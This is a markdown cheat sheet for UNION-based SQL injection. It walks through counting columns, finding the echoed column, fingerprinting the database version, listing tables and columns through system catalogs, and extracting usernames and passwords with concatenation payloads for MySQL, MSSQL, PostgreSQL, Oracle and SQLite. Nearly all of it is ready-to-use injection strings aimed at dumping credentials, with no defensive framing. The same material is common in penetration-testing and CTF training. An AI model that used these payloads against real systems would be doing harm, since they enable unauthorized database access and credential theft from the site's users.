# 2 - UNION-Based SQLi Cheat Sheet

**Overview:** UNION-based SQLi is an In-Band attack that leverages the `UNION` operator to combine the results of a legitimate query with the results of an injected, malicious query. It is the fastest and most efficient way to dump large amounts of data, as the results are printed directly onto the webpage.

---

## The Two Golden Rules of UNION
Before you can extract any data, your injected query must perfectly match the original developer's query in two ways:
1. **Column Count:** Your query must ask for the exact same number of columns.
2. **Data Types:** The columns must be compatible (e.g., you cannot inject a text string into a column designed to hold an integer).

---

## Step 1: Finding the Column Count
You cannot use `UNION` until you know how many columns exist. 

### Method A: The `ORDER BY` Trick
Increment the number until the database throws an error or the page breaks.
* `' ORDER BY 1--+` (Works)
* `' ORDER BY 2--+` (Works)
* `' ORDER BY 3--+` (Breaks -> **The query has 2 columns!**)

### Method B: The `NULL` Array Trick
Increment `NULL` values until the page loads normally. We use `NULL` because it is a universal data type that works in both string and integer columns.
* `' UNION SELECT NULL--+` (Breaks)
* `' UNION SELECT NULL, NULL--+` (Works -> **The query has 2 columns!**)

*(**Oracle Rule:** If the database is Oracle, you MUST append `FROM dual` to the end of these payload: `' UNION SELECT NULL, NULL FROM dual--`)*

---

## Step 2: Finding the "Echo" Column
Once you know the count (e.g., 2 columns), you need to figure out which column actually prints text to the screen. Replace the `NULL` values with strings.
* `' UNION SELECT 'a', 'b'--+`
If the letter 'b' appears on the webpage, you know column 2 is your injection point.

---

## Step 3: Fingerprinting the Database
Inject these version commands into your "echo" column to confirm what database engine you are fighting.

| Database | Version Payload | Example in a 2-Column UNION |
| :--- | :--- | :--- |
| **MySQL** | `version()` or `@@version` | `' UNION SELECT NULL, version()--+` |
| **MSSQL** | `@@version` | `' UNION SELECT NULL, @@version--` |
| **PostgreSQL** | `version()` | `' UNION SELECT NULL, version()--` |
| **Oracle** | `banner` from `v$version` | `' UNION SELECT NULL, banner FROM v$version--` |
| **SQLite** | `sqlite_version()` | `' UNION SELECT NULL, sqlite_version()--` |

---

## Step 4: Mapping the Database (The Blueprints)
Use the standardized `information_schema` to dump the hidden tables and columns. 

**1. Find the Tables:**
* **MySQL/MSSQL/Postgres:** `' UNION SELECT NULL, table_name FROM information_schema.tables--+`
* **Oracle:** `' UNION SELECT NULL, table_name FROM all_tables--`
* **SQLite:** `' UNION SELECT NULL, name FROM sqlite_master WHERE type='table'--`

**2. Find the Columns (e.g., for a table named 'users'):**
* **MySQL/MSSQL/Postgres:** `' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name = 'users'--+`
* **Oracle:** `' UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name = 'USERS'--` *(Table name MUST be uppercase)*
* **SQLite:** `' UNION SELECT NULL, sql FROM sqlite_master WHERE name='users'--`

---

## Step 5: Data Extraction & Concatenation
What if you only have **one** echo column, but you want to extract a username AND a password? You glue them together.

### Horizontal Concatenation (Gluing Columns Together)
Used to extract `admin` and `password` as `admin~password`.

| Database | The "Glue" Syntax | Example Payload |
| :--- | :--- | :--- |
| **MySQL** | `CONCAT()` | `' UNION SELECT NULL, CONCAT(username, '~', password) FROM users--+` |
| **Postgres / Oracle / SQLite** | `||` | `' UNION SELECT NULL, username \|\| '~' \|\| password FROM users--` |
| **MSSQL** | `+` | `' UNION SELECT NULL, username + '~' + password FROM users--` |

### Vertical Concatenation (Gluing Rows Together)
Used to dump an entire table into a single paragraph on the screen.

| Database | The Cheat Code | Example Payload |
| :--- | :--- | :--- |
| **MySQL / SQLite** | `GROUP_CONCAT()` | `' UNION SELECT NULL, GROUP_CONCAT(username) FROM users--+` |
| **PostgreSQL** | `STRING_AGG()` | `' UNION SELECT NULL, STRING_AGG(username, ', ') FROM users--` |

---

## Quick Reminder: The Comment Syntax Quirk
Always remember to use the correct comment syntax to terminate the original query.
* **MySQL:** Requires a trailing space! You must use `--+` (URL encoded space) or `%23` (URL encoded `#` which doesn't need a space). 
* **MSSQL, Postgres, Oracle:** `--` works perfectly on its own without a space.

